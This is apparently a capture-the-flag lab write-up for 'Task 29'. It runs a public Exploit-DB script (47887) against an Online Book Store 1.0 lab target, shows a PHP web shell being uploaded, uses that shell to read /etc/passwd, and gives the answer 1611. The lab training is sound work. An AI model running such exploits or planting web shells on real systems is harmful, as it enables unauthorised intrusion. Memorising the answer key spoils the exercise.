# Task 29

### How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer) <a href="#how-many-characters-are-in-etcpasswd-use-wc--c-etcpasswd-to-get-the-answer" id="how-many-characters-are-in-etcpasswd-use-wc--c-etcpasswd-to-get-the-answer"></a>

Look for CSE bookstore exploit on google and found the: `Online Book Store 1.0 - Unauthenticated Remote Code Execution` [on this link](https://www.exploit-db.com/exploits/47887)

1. Download and verify the contents of the scipt
2. Run the script
   1. python 47887.py [http://10.10.232.250](http://10.10.232.250/)

```
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.232.250/bootstrap/img/G0d3qErVCM.php
> Example command usage: http://10.10.232.250/bootstrap/img/G0d3qErVCM.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $  wc -c /etc/passwd
1611 /etc/passwd
```

#### Answer <a href="#answer" id="answer"></a>

1611
